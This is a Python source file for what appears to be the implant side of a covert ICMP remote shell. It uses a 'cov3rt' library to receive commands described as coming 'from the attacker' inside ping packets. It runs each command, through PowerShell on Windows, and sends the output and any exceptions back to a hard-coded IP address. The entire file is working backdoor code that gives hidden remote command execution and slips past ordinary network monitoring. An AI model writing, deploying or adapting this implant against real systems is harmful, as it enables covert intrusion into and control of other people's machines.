from subprocess import run
from cov3rt.UserCloaks import ICMPEchoFullPayload
from time import sleep
from os import name as OS_NAME

SENDER_IP = "138.47.135.235"
RECEIVER_IP = "138.47.135.235"
sender = ICMPEchoFullPayload(ip_dst=SENDER_IP)
receiver = ICMPEchoFullPayload(ip_dst=RECEIVER_IP)

# Indicate we are ready to receive input
print()

while True:
    try:
        # Receive command from the attacker
        data = receiver.recv_packets()
        # Small sleep to regulate CTRL-C break
        sleep(0.05)
        try:
            # Split the command by traditional delimiters
            command = data.split()
            # Send 'active' if we submit a blank command
            if (len(command) == 0) or (len(command) == 1 and command[0] == ''):
                sender.ingest("active")
                sender.send_packets()
                sender.send_EOT()
                continue
            # Exit program on reception of 'exit'
            if command[0] == 'exit':
                exit()
            # Run with Powershell for windows systems
            if OS_NAME == "nt":
                command.insert(0, "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe")
        # Handle oddity of an Attribute Error by just continuing
        except AttributeError:
            continue
        # Run the command we received
        response = run(command, capture_output=True, text=True).stdout
        # Send the response to the attacker
        sender.ingest(response)
        sender.send_packets()
        sender.send_EOT()
    # Exit on CTRL-C
    except KeyboardInterrupt:
        break
    # Send any other exception to the attacker
    except Exception as e:
        sender.ingest(str(e))
        sender.send_packets()
        sender.send_EOT()
